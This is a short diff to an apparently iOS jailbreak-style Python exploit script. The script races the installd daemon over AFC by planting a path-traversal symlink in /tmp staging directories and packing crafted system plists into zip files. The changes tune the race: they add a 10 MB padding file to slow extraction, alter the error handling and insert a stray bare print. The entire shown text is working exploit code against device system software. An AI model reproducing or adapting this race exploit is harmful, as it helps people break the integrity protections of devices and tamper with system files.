@@ -207,6 +207,7 @@ def race_installd(zip_file, destination):
 					entry = matching_entries[0]
 					
 					staging_contents = afc.read_directory("/tmp/" + entry)
+					print
 					
 					if len(staging_contents) is 2:
 						print(" - Succeeded before extraction!")
@@ -221,7 +222,7 @@ def race_installd(zip_file, destination):
 							afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
 							raise StopIteration
 				except AfcError, e:
-					continue
+					break
 	except StopIteration:
 		return True
 
@@ -287,6 +288,8 @@ def configure_system_stage_2():
 	
 	os.remove("com.apple.mobile.installation.plist.tmp")
 	
+	
+	
 	with open("com.apple.LaunchServices-045.csstore", "w") as launch_services:
 		launch_services.write("")
 	
@@ -310,6 +313,8 @@ def configure_system_stage_2():
 		backboardd.write("</dict>\n")
 		backboardd.write("</plist>")
 	
+	call(["fallocate", "-l", "10M", "bigfile"])
+	
 	with ZipFile("caches.zip", "w") as caches:
 		os.chdir("var/mobile/Library/Caches")
 		caches.write("com.apple.mobile.installation.plist")
@@ -318,6 +323,7 @@ def configure_system_stage_2():
 	
 	with ZipFile("preferences.zip", "w") as preferences:
 		preferences.write("com.apple.backboardd.plist")
+		preferences.write("bigfile")
 	
 	print(" - Attempting to race installd (caches)")
 	
